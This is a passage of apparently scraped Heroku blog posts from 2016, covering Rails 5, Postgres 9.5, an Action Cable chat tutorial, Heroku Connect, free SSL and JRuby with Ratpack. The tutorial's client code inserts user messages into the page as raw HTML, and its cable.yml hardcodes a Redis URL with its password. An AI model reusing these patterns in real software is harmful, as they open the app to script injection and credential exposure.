HTML\n[c6034478-4026-4ded-9e3c-088c76d056f1] Completed 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms) In addition to this benefit, the request can be set via the X-Request-ID header so that the same request could be traced between multiple components. For example, a request comes in from the Heroku router which assigns a request id . As the request is processed we can log that id, then when the request is passed on to Rails, the same id is used. That way if a problem is determined to be not caused in Rails, it could be traced back to other components with the same ID. This default was added in PR #22949 . This is another feature that isn't explicitly required to run on Heroku, however, it will make running an application at scale much easier. Summary Rails 5 is the easiest to use Rails version on Heroku ever. We also hope that it's the easiest version to run anywhere else. We're happy that the power of \"convention over configuration\" can be leveraged by container-based deployment platforms to provide a seamless production experience. Many of these features listed such as request IDs and destructive database safeguards are progressive enhancements that will help all app developers regardless of where they deploy or how they run in production. Heroku has been committed to providing the best possible Ruby and Rails experience from its inception, whether that means building out platform features developers need, automating tasks via the buildpack, or working with upstream maintainers. While we want to provide an easy experience, we don't want one that is too \"magical\" . By working together in open source we can make software easier to deploy and manage for all developers, not just Heroku customers. If you haven't already, try upgrading to Rails 5 beta . Check out this Dev Center article for more information on getting started with Rails 5.x on Heroku . rails ruby rails 5 deployment", "date": "2016-05-02,"},
{"website": "Heroku", "title": "Postgres 9.5 General Availability", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/postgres-95-general-availability", "abstract": "Postgres 9.5 General Availability Posted by Rimas Silkaitis May 03, 2016 Listen to this article Starting today, Postgres 9.5 is now the new default version for all new Heroku Postgres databases. We’ve had hundreds of customers using early beta versions of 9.5 and the feedback has been positive. For many customers, the new UPSERT functionality was the last feature that prevented many of them from moving from other relational databases to Postgres. The engineering staff at Heroku and the Postgres community at large has spent years bringing UPSERT to fruition and the customer feedback is a testament to that hard work. If you want to try out the new version, getting it is as simple as provisioning a new database: $ heroku addons:create heroku-postgresql -a sushi More UPSERT UPSERT, otherwise known as INSERT ... ON CONFLICT , is the functionality that allows records in the database to be updated if one already exists or for a record to be inserted doesn’t. Other relational databases have this same type of functionality but what makes Postgres’ version of it so special is that it will determine if there’s a conflict based on a unique index in the table on specified set of columns. On top of that, if other unique columns exist, Postgres will throw a violation. This means that your data will be safe and there is less risk of data being overwritten by a rogue operation. Inline Updates to JSONB When JSONB came to fruition in Postgres 9.4, it opened up the door to Postgres being used like a document data store. Yet, the 9.4 release was just a first step down that path. One of the major complaints with JSONB was that the json could not be updated in place. If you wanted to update the json in a column, the entire column would need to be updated in the application and then the entire column updated in Postgres. Using the jsonb_set function in Postgres 9.5, JSONB columns can now be updated in place without having to serialize the entire field all over again: SELECT jsonb_set(\n    '{\"name\":\"Chuck\", \"contact\":{\"phone\": \"111 222 3333\" }}'::jsonb,\n    '{contact,phone}',\n    '\"222 333 4444\"'::jsonb); The first parameter is the field that’s going to be changed, the second is the path within the json to the key whose value should change and the final is the actual value. This should speed up working with JSONB fields. Get Started Today The updates to JSONB and the new UPSERT are exciting new additions but Postgres 9.5 has many more features that provide just as much value. Give Postgres 9.5 a shot by provisioning a new Heroku Postgres database and if you have an existing database on the platform, please check out our documentation for upgrading . Get started today and let us know what you think at postgres@heroku.com . postgres 9.5 postgres upsert", "date": "2016-05-03,"},
{"website": "Heroku", "title": "Real-Time Rails: Implementing WebSockets in Rails 5 with Action Cable", "author": ["Sophie DeBenedetto"], "link": "https://blog.heroku.com/real_time_rails_implementing_websockets_in_rails_5_with_action_cable", "abstract": "Real-Time Rails: Implementing WebSockets in Rails 5 with Action Cable Posted by Sophie DeBenedetto May 09, 2016 Listen to this article It's been one year since Action Cable debuted at RailsConf 2015, and Sophie DeBenedetto is here to answer the question in the minds of many developers: what is it really like to implement \"the highlight of Rails 5\"? Sophie is a web developer and an instructor at the Flatiron School. Her first love is Ruby on Rails, although she has developed projects with and written about Rails, Ember and Phoenix. Recent years have seen the rise of \"the real-time web.\" Web apps we use every day rely on real-time features—the sort of features that let you see new posts magically appearing at the top of your feeds without having to lift a finger. While we may take those features for granted, they represent a significant departure from the HTTP protocol's strict request-response pattern. Real-time web, by contrast, loosely describes a system in which users receive new information from the server as soon as it is available—no request required. There are a number of strategies and technologies for implementing such real-time functionality, but the WebSocket protocol has been rising to prominence since its development in 2009. However, up until very recently, implementing the WebSocket protocol in Rails was difficult. There was no native support, and any real-time feature required integrating third party libraries and strategies like Faye or JavaScript polling.  So let’s take a closer look at WebSockets and how Rails 5 has evolved to support real-time apps with Action Cable. What are WebSockets? WebSockets are a protocol built on top of TCP. They hold the connection to the server open so that the server can send information to the client, even in the absence of a request from the client. WebSockets allow for bi-directional, \"full-duplex\" communication between the client and the server by creating a persistent connection between the two. With the development of Action Cable and its recent integration into Rails 5, we now have a full-stack, easy-to-use implementation of WebSockets that follows the Rails design patterns we've come to rely on.  The only question is why it took so long. The Path to Real-Time Rails In 2015, Rails' benevolent-dictator-for-life DHH changed his tune about sockets. He started by acknowledging an important truth: that \"dealing with WebSockets is a pain in the [you know what].\" And although it wasn't necessarily a pleasure to code, you could build real-time features into Rails with nothing more than Faye and Javascript polling. In fact, Campfire, Basecamp's own chatting application, has been using polling for about a decade, and I've built compelling real-time features that way too. But DHH knew there's something lost without sockets. \"If you can make WebSockets even less work than polling, why wouldn't you do it?\" Sure, polling met the needs of his team (and many others) for many years. But as more and more consumers and developers began demanding real-time functionality, and as newer frameworks like Phoenix arrived to meet that demand, Rails felt the need to deliver—and in fact, Action Cable draws some inspiration from Phoenix channels. It hasn't been smooth sailing. I've followed the development of Action Cable closely, and before it was merged into Rails 5, I would say that it wasn't easier than polling. But after a year of development, it's very easy to implement, and it aligns nicely with the other design patterns we've become so comfortable with in Rails. So, how does the \"highlight\" of Rails 5 work, and what's it like to implement? Let's take a closer look! Introducing Action Cable So what do we have to look forward to? Well, it's what the docs call a \"full-stack offering\": it provides both a client-side JavaScript framework, and a server-side Ruby framework. And because it integrates so tightly with Rails, we have access to all of our models from within our WebSocket workers, effectively layering Action Cable on top of our existing Rails architecture, including Active Record (or any other ORM). Action Cable Under the Hood Before we dive into some code, let's take a closer look at how Action Cable opens and maintains the WebSocket connection inside our Rails 5 application. Action Cable can be run on a stand-alone server, or we can configure it to run on its own processes within the main application server. In this post, we'll be taking a look at the second approach. Action Cable uses the Rack socket hijacking API to take over control of connections from the application server. Action Cable then manages connections internally, in a multithreaded manner, layering as many channels as you care to define over that socket connection. For every instance of your application that spins up, an instance of Action Cable is created, using Rack to open and maintain a persistent connection, and using a channel mounted on a sub-URI of your main application to stream from certain areas of your application and broadcast to other areas. Action Cable offers server-side code to broadcast certain content (think new messages or notifications) over the channel, to a subscriber. The subscriber is instantiated on the client-side with a handy JavaScript function that uses jQuery to append new content to the DOM. Lastly, Action Cable uses Redis as a data store for transient data, syncing content across instances of your application. Now that we have a basic understanding of how Action Cable works, we'll build out a basic chatting application in Rails 5, taking a closer look at how Action Cable behaves along the way. Building a Real-Time Chat App with Action Cable Getting Started: Application Architecture In this example, we'll build a basic chatting application in which users can log in or sign up to create a username, then create a new chat room or choose from an existing chat room and start messaging. We'll use Action Cable to ensure that our chat feature is real-time: any users in a given chat room will see new messages (their own and the messages of other users) appear in the chat, without reloading the page or engaging in any other action to request new content. You can follow along below, check out the code for this project on GitHub , visit my deployment here or, deploy your own copy by clicking this button. Starting a new Rails 5 app with Action Cable At the time of this writing, Rails 5 was in Beta 3. So, to start a new Rails 5 app, we need to do the following. First, make sure you have installed and are using Ruby 2.3.0. Then: $ gem install rails --pre\nSuccessfully installed rails-5.0.0.beta3\nParsing documentation for rails-5.0.0.beta3\nDone installing documentation for rails after 1 seconds\n1 gem installed You'll also need to have Postgres and Redis installed in order to build this app. You can brew install redis and brew install postgres if you haven't done so already. Now we're ready to generate our new app! rails new action-cable-example --database=postgresql This will generate a shiny new Rails 5 app, complete with all kinds of goodies in our Gemfile. Open up the Gemfile and you'll notice that we have: The latest version of Rails # Gemfile\ngem 'rails', '>= 5.0.0.beta3', '< 5.1' Redis (which we will need to un-comment out): # Gemfile\n# gem 'redis', '~> 3.0' Puma (since Action Cable needs a threaded server): # Gemfile\ngem 'puma' Make sure you've un-commented out the Redis gem from your Gemfile, and bundle install . Domain Model Our domain model is simple: we have users, chat rooms and messages. A chat room will have a topic and it will have many messages. A message will have content, and it will belong to a user and belong to a chatroom. A user will have a username, and will have many messages. The remainder of this tutorial will assume that we have already generated the migrations necessary to create the chat rooms, messages and users table, and that we have already defined our Chatroom, User and Message model to have the relationships described above. Let's take a quick look at our models before we move on. # app/models/chatroom.rb\n\nclass Chatroom < ApplicationRecord\n  has_many :messages, dependent: :destroy\n  has_many :users, through: :messages\n  validates :topic, presence: true, uniqueness: true, case_sensitive: false\nend # app/models/message.rb\n\nclass Message < ApplicationRecord\n  belongs_to :chatroom\n  belongs_to :user\nend # app/models/user.rb\n\nclass User < ApplicationRecord\n  has_many :messages\n  has_many :chatrooms, through: :messages\n  validates :username, presence: true, uniqueness: true\nend Application Flow We'll also assume that our routes and controllers are up and running. A user can log in with a username, visit a chat room and create new messages via a form on the chat room's show page. Accordingly, the #show action of the Chatrooms Controller sets up both a @chatroom instance as well as a new, empty @message instance that will be used to build our form for a new message, on the chatroom's show page: # app/controllers/chatrooms_controller.rb\n\nclass ChatroomsController < ApplicationController\n  ...\n\n  def show\n    @chatroom = Chatroom.find_by(slug: params[:slug])\n    @message = Message.new\n  end\nend Our chatroom show page renders the partial for the message form: # app/views/chatrooms/show.html.erb\n\n<div class=\"row col-md-8 col-md-offset-2\">\n  <h1><%= @chatroom.topic %></h1>\n\n<div class=\"panel panel-default\">\n  <% if @chatroom.messages.any? %>\n    <div class=\"panel-body\" id=\"messages\">\n      <%= render partial: 'messages/message', collection: @chatroom.messages%>\n    </div>\n  <%else%>\n    <div class=\"panel-body hidden\" id=\"messages\">\n    </div>\n  <%end%>\n</div>\n\n  <%= render partial: 'messages/message_form', locals: {message: @message, chatroom: @chatroom}%>\n</div> And our form for a new message looks like this: # app/views/messages/_message_form.html.erb\n\n<%= form_for message, remote: true, authenticity_token: true do |f| %>\n  <%= f.label :your_message %>:\n  <%= f.text_area :content, class: \"form-control\", data: {textarea: \"message\"} %>\n\n  <%= f.hidden_field :chatroom_id, value: chatroom.id %>\n  <%= f.submit \"send\", class: \"btn btn-primary\", style: \"display: none\", data: {send: \"message\"} %>\n<% end %> Our new message form posts to the create action of the Messages Controller class MessagesController < ApplicationController\n\n  def create\n    message = Message.new(message_params)\n    message.user = current_user\n    if message.save\n      # do some stuff\n    else \n      redirect_to chatrooms_path\n    end\n  end\n\n  private\n\n    def message_params\n      params.require(:message).permit(:content, :chatroom_id)\n    end\nend Okay, now that we have our app up and running, let's get those real-time messages working with Action Cable. Implementing Action Cable Before we define our very own Messages Channel and start working directly with Action Cable code, let's take a quick tour of the Action Cable infrastructure that Rails 5 provides for us. When we generated our brand new Rails 5 application, the following directory was generated for us: ├── app\n    ├── channels\n        ├── application_cable\n            ├── channel.rb\n            └── connection.rb Our ApplicationCable module has a Channel and a Connection class defined for us. The Connection class is where we would authorize the incoming connection—for example, establishing a channel to a given user’s inbox, which requires user authorization. We'll leave this class alone, as any user can join any chat room at any time. However, the Messages Channel that we will define shortly will inherit from ApplicationCable::Channel . module ApplicationCable\n  class Connection < ActionCable::Connection::Base\n  end\nend The Channel class is where we would place shared logic among any additional channels that we will define. We'll only be creating one channel, the Messages Channel, so we'll leave this class alone as well. # app/channels/channel.rb\n\nmodule ApplicationCable\n  class Channel < ActionCable::Channel::Base\n  end\nend Okay, let's move on to writing our own Action Cable code. First things first, setting up the instance of the Action Cable server. Establishing the WebSocket Connection Step 1: Establish the Socket Connection: Server-Side First, we need to mount the Action Cable server on a sub-URI of our main application. In routes.rb : Rails.application.routes.draw do\n\n  # Serve websocket cable requests in-process\n  mount ActionCable.server => '/cable'\n\n  resources :chatrooms, param: :slug\n  resources :messages\n\n  ...\n\nend Now, Action Cable will be listening for WebSocket requests on ws://localhost:3000/cable . It will do so by using the Rack socket hijacking API. When our main application is instantiated, an instance of Action Cable will also be created. Action Cable will, per our instructions in the routes.rb file, establish a WebSocket connection on localhost:3000/cable , and begin listening for socket requests on that URI. Now that we've established the socket connection on the server-side, we need to create the client of the WebSocket connection, called the consumer. Step 2: Establish the Socket Connection: Client-Side In app/assets/javascripts/channels we'll create a file: chatrooms.js . Here is where we will define the client-side instance of our WebSocket connection. // app/assets/javascripts/channels/chatrooms.js\n\n//= require cable\n//= require_self\n//= require_tree .\n\nthis.App = {};\n\nApp.cable = ActionCable.createConsumer(); Note: Make sure you require the channels subdirectory in your asset pipeline by adding it to your application.js manifest file: // app/assets/javascripts/application.js\n\n//= require_tree ./channels Notice that the ActionCable.createConsumer function doesn't specify the socket URI , ws://localhost:3000/cable . How does the consumer know where to connect? We'll specify the development and production socket URIs in the appropriate environment files, and pass it through to the consumer via the action_cable_meta_tag . In development # config/development.rb\nRails.application.configure do \n  config.action_cable.url = \"ws://localhost:3000/cable\"\nend The following line is included for us in the head of our application layout: # app/vippews/layouts/application.html.erb\n\n<%= action_cable_meta_tag %> Note: The default Action Cable URI is in fact ws://localhost:3000/cable , so we could have gotten away without configuring the cable url in development. I wanted to expose this configuration for anyone who wants to customize it in the future. Building the Channel So far, we've used Action Cable to create a persistent connection, listening for any WebSocket requests on ws://localhost:3000/cable . This isn't enough to get our real-time messaging feature, however. We need to define a special Messages Channel and instruct the appropriate parts of our application to broadcast to and stream from this channel. Step 1: Define the Channel Defining a channel with Action Cable is easy. We'll create a file, app/channels/messages_channel . Here we will define our channel to inherit from the ApplicationCable::Channel class that we described earlier on. # app/channels/messages_channel.rb\n\nclass MessagesChannel < ApplicationCable::Channel  \n\nend Our Messages Channel needs only one method for our purposes, the #subscribed method. This method is responsible for subscribing to and streaming messages that are broadcast to this channel. # app/channels/messages_channel.rb\nclass MessagesChannel < ApplicationCable::Channel  \n  def subscribed\n    stream_from 'messages'\n  end\nend We'll revisit this method in a bit, and discuss how and when it is invoked. First, let's define how and when Action Cable should broadcast new messages to the channel. Step 2: Broadcast to the Channel At what point in time should a new message get broadcast to the Messages Channel? Immediately after it is created and persisted to the database. So, we'll define our broadcasting code within the #create action of the Messages Controller. #  app/controllers/messages_controller.rb\n\nclass MessagesController < ApplicationController\n\n  def create\n    message = Message.new(message_params)\n    message.user = current_user\n    if message.save\n      ActionCable.server.broadcast 'messages',\n        message: message.content,\n        user: message.user.username\n      head :ok\n    end\n  end\n\n  ...\nend Here we are calling the #broadcast method on our Action Cable server, and passing it arguments: 'messages' , the name of the channel to which we are broadcasting. Some content that will be sent through the channel as JSON: message , set to the content of the message we just created. user , set to the username of the user who created the message. Note: There is nothing special about the message or user key here. We can structure or label the data we want to send across the channel any way we like. As long as we tell our subscriber (more on that soon) to access that data in accordance with how we structured it here. Step 3: Action Cable Loves Redis This isn't a \"step\", since we don't have to actually do anything (yet). But let's take a moment to look at how Action Cable pairs with Redis. Action Cable uses Redis to send and receive messages over the channel. So, when we told our Action Cable server to #broadcast to 'messages' , we were actually saying \"send new messages to the 'messages' channel maintained by Redis.\" At the same time, the #subscribed method of our Messages Channel is really streaming messages sent over the 'messages' channel maintained by Redis. Thus, Redis acts as a data store and ensures that messages will remain in sync across instances of our application. Action Cable will look for the Redis configuration in Rails.root.join('config/cable.yml') . When we generated our new Rails 5 app, we also generated a file, config/cable.yml , that looks like this: production:\n  adapter: redis\n  url: redis://localhost:6379/1\n\ndevelopment:\n  adapter: async\n\ntest:\n  adapter: async Here, we are specifying an adapter and a URL for each environment. We'll be running Redis on localhost for now. Later, when we discuss deployment, we'll update the production environment's Redis URL. Defining the Channel's Subscriber We're almost done! We just need to create a client-side subscriber to our Messages Channel. Recall that earlier, we created our consumer with the following lines of code: // app/assets/javascripts/channels/chatrooms.js\n\nthis.App = {};\n\nApp.cable = ActionCable.createConsumer(); Our consumer is the client-side end of our persistent WebSocket connection. Now, we need to add a subscription to our consumer, telling it to subscribe to the Messages Channel. Create a file, app/assets/javascripts/channels/messages.js . Here we will define our subscription: // app/assets/javascripts/channels/messages.js\n\nApp.messages = App.cable.subscriptions.create('MessagesChannel', {  \n  received: function(data) {\n    $(\"#messages\").removeClass('hidden')\n    return $('#messages').append(this.renderMessage(data));\n  },\n\n  renderMessage: function(data) {\n    return \"<p> <b>\" + data.user + \": </b>\" + data.message + \"</p>\";\n  }\n}); We add our new subscription to our consumer with App.cable.subscriptions.create . We give this function an argument of the name of the channel to which we want to subscribe, MessagesChannel . When this subscriptions.create function is invoked, it will invoke the MessagesChannel#subscribed method, which is in fact a callback method. MessagesChannel#subscribed streams from our messages broadcast, sending along any new messages as JSON to the client-side subscription function. Then, the received function is invoked, with an argument of this new message JSON. The received function in turn calls a helper function that we have defined, renderMessage , which simply appends new messages to the DOM, using the $(\"#messages\") jQuery selector, which can be found on the chatroom show page. Deploying our Application to Heroku Now that our real-time messaging feature is up and running, we're ready to deploy! Deploying a Rails 5 app that uses Action Cable is simple. We just need to configure a few things for our production environment. Step 1: Create Your Heroku App First things first, though! Let's create our Heroku app: heroku create action-cable-example-app Step 2: Provision the Redis To Go Addon In the command line, run: heroku addons:add redistogo Then, retrieve your Redis To Go URL and update your Action Cable Redis configuration. $ heroku config --app action-cable-example | grep REDISTOGO_URL\nREDISTOGO_URL:            redis://redistogo:d0ed635634356d4408c1effb00bc9493@hoki.redistogo.com:9247/ # config/cable.yml\n\nproduction:\n  adapter: redis\n  url: redis://redistogo:d0ed635634356d4408c1effb00bc9493@hoki.redistogo.com:9247/\n\ndevelopment:\n  adapter: async\n\ntest:\n  adapter: async Step 3: Configure Action Cable's Production URI We need to set the cable server's URI for production. # config/environments/production.rb\n\nconfig.web_socket_server_url = \"wss://action-cable-example.herokuapp.com/cable\" Note: In production, we are using a secure WebSocket connection, wss . Step 4: Allowed Request Origins Action Cable can only accept WebSocket requests from specified origins. We need to pass those origins to the Action Cable server's configuration as an array. # config/environments/production.rb\n\nconfig.action_cable.allowed_request_origins = ['https://action-cable-example.herokuapp.com', 'http://action-cable-example.herokuapp.com'] Step 5: Deploy! Now we're ready to git push heroku master . Go ahead and migrate your database and you should be good to go. Action Cable: Comprehensive, Sleek and Easy to Use So how does Action Cable stack up to DHH's claims, one year later? So far, we've seen that Action Cable runs seamlessly alongside our main Rails application. Its implementation falls right in line with the design patterns we've become so familiar with. We mount the Action Cable server in the routes.rb file, alongside the rest of our routes. We write the code to broadcast new messages in the #create action of the Messages Controller, and we subscribe to those messages in a channel we define similarly to the manner in which we define Rails controllers. Not only does Action Cable seamlessly integrate with the rest of our Rails application, it provides easy-to-use client-side code, making it a full stack offering. Above all, it allows Rails developers who want real-time functionality to be totally self-reliant. We no longer need to look towards external libraries like Faye and Private Pub or implement strategies like JavaScript polling. With the addition of Action Cable, Rails is a truly integrated system with which to build a full-stack application. Over all, Action Cable is a very welcome addition to the Rails tool kit. Sophie DeBenedetto is a web developer and an instructor at the Flatiron School. Her first love is Ruby on Rails, although she has developed projects with and written about Rails, Ember and Phoenix. You can learn more about her recent projects by visiting her personal site , checking out her GitHub account , or reading her blog . rails ruby rails 5 action cable websockets sockets real-time", "date": "2016-05-09,"},
{"website": "Heroku", "title": "Heroku Connect APIs Now GA ", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/heroku-connect-apis-ga", "abstract": "Heroku Connect APIs Now GA Posted by Margaret Francis May 10, 2016 Listen to this article Today we’re announcing that the APIs for the Heroku Connect data synchronization service are now GA.  These fully supported endpoints will help our users with the tasks they most need repeatable automation for: creating consistent configuration across development, staging, and production environments; managing connections across multiple Salesforce deployments; and integrating Heroku Connect status with their existing operational systems and alerts. When we first released Heroku Connect, users were delighted with the simple point and click UI: they could suddenly integrate Salesforce data with Heroku Postgres in one enjoyable minute!  But as users’ familiarity with the service has grown and their use cases have become more sophisticated, we’ve heard increasing demand for the APIs that would help users drive the service programmatically.  A common request from partners, ISVs, and multi-org operators has been an endpoint they can use to check status for every mapping on every connection and tune their operational monitoring accordingly. Take Me to the APIs The APIs now in GA are focused on the core operations of Heroku Connect:  creating an authenticated connection between a Salesforce deployment and Heroku Postgres, configuring the data mappings, reload/restart/pause, and retrieving synchronization status.  Any connection instantiated and managed via the API may also be accessed via the Heroku Connect UI. Some context is provided only in the docs or the UI, such as detailed explanations of service behavior in polling vs. streaming mode. Full documentation of Heroku Connect and the APIs is available on the Heroku Dev Center.  We recommend you use the APIs via the Heroku Toolbelt. There is connection level throttling in place: 5,000 calls a day, plus a 100 calls/day limitation on “Poll Now.” The “Poll Now” call is very handy for development purposes when you want to test whether data is moving, but not intended to replace the deliberately tuned sync frequency settings. New Supported Objects App We’ve also published a new Supported Objects app that describes which Salesforce objects are fully supported by their Salesforce API version.  While the Dev Center docs explain that certain objects (such as those without SystemModStamp) load successfully but do not sync, the list and search functions on the app reduce the need to read the documentation in favor of a fast answer for a specific object. Summary We are looking forward to continuing the buildout of the APIs based on feedback from the Salesforce Heroku developer community.  Getting started is easy, we’ve included a step-by-step walk through in the docs. Requests for updates, modifications, new endpoints and other features are always welcome via support tickets or feedback on the Dev Center docs . Heroku Connect api salesforce data integration", "date": "2016-05-10,"},
{"website": "Heroku", "title": "Announcing Heroku Free SSL Beta and Flexible Dyno Hours", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/announcing_heroku_free_ssl_beta_and_flexible_dyno_hours", "abstract": "Announcing Heroku Free SSL Beta and Flexible Dyno Hours Posted by Brett Goulder May 18, 2016 Listen to this article Editor's Note: SSL Is Now Included on All Paid Dynos as of September 22, 2016 At Heroku, we want to make it easy for everyone to be able to learn and explore our service, and the related ecosystem of technologies, for free - be it student, professional developer, hobbyist or just curious individual.  We view this as both part of our mission and our business model; it has never been a more interesting - or important - time to be a developer, and we want to help everyone become one. Today we are announcing two important updates to help bring us closer to that goal: a new and free SSL service and a more flexible way to use free dyno hours. Heroku SSL is being introduced as beta today, and will be rolled out over the coming weeks and months; flexible dyno hours roll out is scheduled to begin on June 1st. Heroku SSL: Encryption as the Default Encrypted communication has gradually become a default requirement for all web applications on the Internet. Since our inception, Heroku has made it easy to add SSL encryption to web applications, and today we’re announcing that SSL encryption on custom domains is available (as a beta feature) at no additional charge on Hobby and Professional dynos. All you need is a registered domain name and a valid SSL certificate for the domain. The new SSL service relies on the SNI (“Server Name Indication”) extension to SSL which is now supported by the vast majority of browsers and client libraries. The existing Heroku SSL Endpoint add-on will remain available and supported  for users wanting compatibility with non-SNI clients. To begin using the Heroku SSL beta, first ensure that you are running a Hobby or Professional Dyno. Enable the labs flag on your application and install the beta CLI plug-in: $ heroku labs:enable http-sni --app <your app>\n$ heroku plugins:install heroku-certs This beta is being rolled out gradually on a first-come, first-served basis in order to ensure platform stability. If you get an error when enabling the http-sni flag, please try again at a later time. And then you can add an SSL certificate to your application by running: $ heroku _certs:add example.crt example.key --app <your app>\n# Use the --type sni flag if you have an SSL Endpoint add-on on your application already. As part of this new feature, we’re happy to introduce a brand new Dashboard interface for adding certificates: For more information on the Heroku SSL beta, have a look at our Dev Center documentation . Note that as always, your applications can also serve encrypted traffic on the .herokuapp.com domain with no configuration, custom domain or certificate required. This option is available to all dyno types, including free dynos. Flexible Free Dyno Hours Today we are also announcing a change to how free dyno hours work, one that we hope better accommodates the ways in which developers learn and explore on Heroku. With this new, more flexible model, free dyno hours are now allocated and managed on a per account, instead of a per app, basis. And these hours can be applied across your apps however you choose; run a single app (like a chat bot) 24/7, or allow many apps to work on a more occasional basis. When your app is not receiving traffic we will put it to sleep so it doesn’t consume any free dyno hours. When a user again visits the app, we will automatically wake it up. Starting June 1st, when you sign up for a Heroku account you will immediately get 550 free dyno hours. In addition, we add another 450 dyno hours for a total of 1,000 free dyno hours if you verify your identity by providing us with a valid credit card. We do not charge this card unless you use paid services, and ask for this information as an identity confirmation step.  (Alternative identity confirmation methods will be introduced in the future.) Free dyno hours are replenished automatically at the start of every month, with utilization information available in Dashboard: The heroku command line tool will show the total remaining free hours when you run the heroku ps command: Free dyno hours quota remaining this month: 350 hrs (35%)   \n\n=== web (Free): bundle exec puma -C config/puma.rb (1)\nweb.1: idle 2016/05/01 16:43:50 -0500 We also help you keep an eye on your consumption by sending an email notification if you consume more than 80% of the free hours in a month. Should you reach 100%, we will notify again and all free dynos will stop running until the end of the month. At the beginning of the new month, your free dyno hours are replenished and we spin the dynos back up. You can avoid running out of free dyno hours by upgrading your most successful apps to Hobby dynos. Existing accounts are scheduled to be migrated on June 1st, and you will receive a dashboard and email notification when your account is converted. Users who are already consuming more than 1,000 hours / month will be grandfathered via additional hours automatically added to their quota, up to 2,500 hours / month. Read more about the changes in the FAQ . Feedback We hope these changes make Heroku simpler and more enjoyable. Feedback on both our new SSL and dyno hours features are welcome and appreciated. Please reach out to our support team and we will be happy to help out. ssl free", "date": "2016-05-18,"},
{"website": "Heroku", "title": "Reactive Ruby: Building Real-time Apps with JRuby and Ratpack", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/reactive_ruby_building_real_time_apps_with_jruby_and_ratpack", "abstract": "Reactive Ruby: Building Real-time Apps with JRuby and Ratpack Posted by Joe Kutner May 24, 2016 Listen to this article Nothing beats Ruby when it comes to rapid development, quick feedback, and delightful coding. The Ruby runtime and traditional ruby frameworks favor synchronous programming, which makes them easy to use and understand. But microservices and real-time apps require asynchronous programming and non-blocking IO to enable maximum throughput. That's where JRuby comes in. You can build reactive microservices in Ruby using JRuby and frameworks like Ratpack . JRuby interprets Ruby code into Java Virtual Machine (JVM) bytecode to gain the performance and concurrency benefits of Java without writing any Java code or XML. But the performance benefits of the JVM are just the beginning. You can also use JRuby to leverage libraries like Ratpack, a micro-framework for building modern HTTP applications with reactive principles in mind. Together, JRuby and Ratpack make an excellent platform for reactive systems. In a moment, you’ll learn how to build such an app, but we first need to define this “reactive” buzzword. What does it mean to be reactive? The term “reactive” implies many different characteristics, such as applying backpressure from a client. But another important characteristic is an ability to perform non-blocking communication. When a thread of execution in a reactive application waits for an external service (like a database or other microservice) the thread will release itself to go do other work instead of blocking and waiting for the response. The difference between blocking and non-blocking looks like this: A reactive system increases throughput by allowing the server thread to do other work while the database is processing its response. In this way, it can more fully saturate the CPU and improve performance. To implement this kind of architecture, you need a runtime and framework that are built from the ground up to support non-blocking IO. JRuby supports Rails, Sinatra, Puma, Eventmachine, Sidekiq, and almost all of your favorite CRuby libraries and frameworks. But JRuby also opens the door to new technologies. Among those new technologies is Ratpack, which is loosely comparable to Sinatra. Unlike Sinatra, however, it leverages the powerful concurrency libraries of the JVM to provide an interface with first-class support for asynchronous programming and non-blocking IO. Ratpack is a JVM framework, but you can use it with your favorite Ruby tools. Creating a JRuby and Ratpack app To create a JRuby Ratpack app, you’ll need to install JRuby. You can download the binaries for your platform from the JRuby website or run rvm install jruby if you’re using RVM . Now create a directory for your app, move into it, and create a Gemfile with these contents: source \"https://rubygems.org\" \n\nruby '2.3.0', :engine => 'jruby', :engine_version => '9.1.1.0' \n\ngem \"jbundler\", \"0.9.2\" This adds JBundler, which installs Java dependencies as if they were Ruby Gems. Initialize Bundler and JBundler by running these commands: $ jgem install bundler\n$ jruby -S bundle install --binstubs JBundler uses a Jarfile to manage dependencies. Create this file alongside your Gemfile , and put the following code in it: jar 'io.ratpack:ratpack-core', '1.3.3' \njar 'org.slf4j:slf4j-simple', '1.7.10' Then run JBundler to install the JAR dependencies: $ bin/jbundle install Now you’re ready to create an app. In the same directory as the Gemfile and Jarfile , create a server.rb file and put the following code in it: require 'java' \nrequire 'jruby/core_ext'\nrequire 'bundler/setup' \nBundler.require\n\njava_import 'ratpack.server.RatpackServer'\n\nRatpackServer.start do |b| \n  b.handlers do |chain| \n    chain.get do |ctx| \n      ctx.render(\"Hello from Ratpack+JRuby\") \n    end\n  end\nend This creates a Ratpack server, and defines a single get handler in the handler chain , which is a Ratpack concept used to facilitate asynchronous and non-blocking IO. This handler renders the string \"Hello from Ratpack+JRuby\" for the default / route. Save the file, and start the server by running this command: $ jruby server.rb Open a browser and point it to http://localhost:5050 , and you’ll see the output rendered by the handler. This is a great start, but it doesn’t demonstrate the full power of Ratpack. Let’s add a streaming service. Non-Blocking streaming Open the server.rb file again, and add these statements immediately after the first java_import : java_import 'ratpack.stream.Streams'\njava_import 'ratpack.http.ResponseChunks'\njava_import 'java.time.Duration' Then add the following code to the b.handlers block after the first get handler: chain.get(\"stream\") do |ctx|\n  publisher = Streams.periodically(ctx, Duration.ofMillis(1000)) do |i|\n    i < 10 ? i.to_s : nil\n  end\n  ctx.render(ResponseChunks.stringChunks(publisher))\nend This creates another get handler, but on the /stream route. It will stream a series of numbers to the client without blocking the request thread. When the stream is paused (every 1000 milliseconds) it will release the thread so it can do other work. This is particularly beneficial when the stream needs to consume data from a remote resource. Start the app again with the jruby server.rb command. Then browse to http://localhost:5050/stream and you’ll see the integers rendered every 1000 milliseconds. You’re starting to unlock the power of a reactive system. Not only does this service periodically publish new items, it will also apply back pressure based heuristics. But there is much more Ratpack can do. Let’s add a database to the application to make use of some more reactive features. Using a database JRuby works with many popular Ruby database clients including ActiveRecord and Sequel. In this example, we’ll use Sequel to interact with a single table mapped to a Ruby class. Database queries and updates can be expensive so we’ll wrap them with Ratpack Promises to prevent the IO operations from blocking the request thread. To set up Sequel you’ll need a database migration, a Rake task, a model class, and of course a database. Rather than write all of this from scratch, you can deploy the example app to Heroku by clicking this button: The example app extends the application you’ve already created, so it will look familiar. After you’ve deployed it, get a local copy of the app by running these commands (but replace with the name of your Heroku app): $ git clone https://github.com/jkutner/ratpack-jruby-example\n$ cd ratpack-jruby-example\n$ heroku git:remote <app-name> Open the project’s server.rb file, and you’ll see some new handlers that look like this: c1.get do |ctx|\n  Blocking.get do\n    DB[:widgets].all\n  end.then do |widgets|\n    ctx.render(JSON.dump(widgets))\n  end\nend The 